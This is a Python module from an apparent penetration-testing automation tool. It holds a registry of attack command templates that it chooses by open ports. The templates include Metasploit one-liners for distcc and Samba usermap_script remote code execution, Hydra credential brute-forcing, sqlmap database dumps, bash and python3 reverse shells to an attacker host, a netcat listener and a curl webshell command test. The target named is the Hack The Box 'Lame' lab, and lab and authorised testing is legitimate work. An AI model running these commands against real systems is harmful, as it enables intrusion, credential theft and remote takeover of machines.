from typing import Any

from phases.common import Tool


_TOOL_REGISTRY: list[Tool] = [
    Tool(
        id="msf_auto",
        label="Metasploit (auto-configure)",
        command_template="msfconsole -x 'use {module}; set RHOSTS {target}; set RPORT {port}; run; exit'",
        description="Auto-configure MSF module from Phase 2 findings",
        requires_input=["module", "port"],
    ),
    Tool(
        id="hydra",
        label="Hydra (brute-force)",
        command_template="hydra -L {userlist} -P {passlist} {target} {service}",
        description="Credential brute-force — specify wordlist paths",
        requires_input=["userlist", "passlist", "service"],
        timeout=300,
    ),
    Tool(
        id="searchsploit_mirror",
        label="searchsploit -m (copy exploit)",
        command_template="searchsploit -m {exploit_id}",
        description="Copy a public exploit script to the current directory",
        requires_input=["exploit_id"],
        timeout=10,
    ),
    Tool(
        id="sqlmap",
        label="sqlmap",
        command_template="sqlmap -u {url} --batch --dbs",
        description="Automated SQL injection detection and database dump",
        optional=True,
        condition="port_web",
        requires_input=["url"],
        timeout=300,
    ),
    Tool(
        id="reverse_shell_bash",
        label="Reverse shell (bash)",
        command_template="bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
        description="One-liner bash reverse shell — displays command to run on target",
        optional=True,
        condition="port_web",
        requires_input=["lhost", "lport"],
        display_only=True,
    ),
    Tool(
        id="reverse_shell_python",
        label="Reverse shell (python3)",
        command_template=(
            "python3 -c 'import socket,subprocess,os;"
            "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        description="Python3 reverse shell — displays command to run on target",
        optional=True,
        condition="port_web",
        requires_input=["lhost", "lport"],
        display_only=True,
    ),
    Tool(
        id="nc_listener",
        label="nc listener (catch shell)",
        command_template="nc -lvnp {lport}",
        description="Start a netcat listener on the attacker machine to catch reverse shell",
        requires_input=["lport"],
    ),
    Tool(
        id="webshell_curl",
        label="webshell (curl RCE test)",
        command_template="curl -s 'http://{target}/{path}?cmd={cmd}'",
        description="Test command execution via an uploaded or planted webshell",
        optional=True,
        condition="port_web",
        requires_input=["path", "cmd"],
        timeout=15,
    ),
    Tool(
        id="msf_distcc",
        label="Metasploit (distcc RCE)",
        command_template="msfconsole -x 'use exploit/unix/misc/distcc_exec; set RHOSTS {target}; set LHOST {lhost}; run; exit'",
        description="Exploit distccd CVE-2004-2687 for RCE (HTB Lame path)",
        optional=True,
        condition="port_distcc",
        requires_input=["lhost"],
    ),
    Tool(
        id="msf_samba_usermap",
        label="Metasploit (Samba usermap_script)",
        command_template="msfconsole -x 'use exploit/multi/samba/usermap_script; set RHOSTS {target}; set LHOST {lhost}; run; exit'",
        description="Samba 3.0.20 username map script RCE — CVE-2007-2447 (HTB Lame)",
        optional=True,
        condition="port_smb",
        requires_input=["lhost"],
    ),
]

_TOOL_MAP: dict[str, Tool] = {t.id: t for t in _TOOL_REGISTRY}


def get_tools(open_ports: set[int], exploit_info: dict[str, Any] | None = None) -> list[Tool]:
    """Return Phase 3 tools relevant to current findings."""
    tools: list[Tool] = []

    if exploit_info and exploit_info.get("msf_module"):
        if msf := _TOOL_MAP.get("msf_auto"):
            tools.append(msf)

    if open_ports & {3632}:
        if t := _TOOL_MAP.get("msf_distcc"):
            tools.append(t)

    if open_ports & {445, 139}:
        if t := _TOOL_MAP.get("msf_samba_usermap"):
            tools.append(t)

    if open_ports & {21, 22, 23, 25, 110, 143, 3389}:
        if hydra := _TOOL_MAP.get("hydra"):
            tools.append(hydra)

    if mirror := _TOOL_MAP.get("searchsploit_mirror"):
        tools.append(mirror)

    if nc := _TOOL_MAP.get("nc_listener"):
        tools.append(nc)

    if open_ports & {80, 443, 8080, 8443}:
        for tid in ("sqlmap", "reverse_shell_bash", "reverse_shell_python", "webshell_curl"):
            if t := _TOOL_MAP.get(tid):
                tools.append(t)
    else:
        for tid in ("reverse_shell_bash", "reverse_shell_python"):
            if t := _TOOL_MAP.get(tid):
                tools.append(t)

    return tools


def build_msf_command(target: str, module: str, port: int, options: dict[str, str] | None = None) -> str:
    """Construct a msfconsole -x one-liner from module parameters."""
    extra = ""
    if options:
        extra = "; ".join(f"set {k} {v}" for k, v in options.items()) + "; "
    return (
        f"msfconsole -x 'use {module}; set RHOSTS {target}; "
        f"set RPORT {port}; {extra}run; exit'"
    )
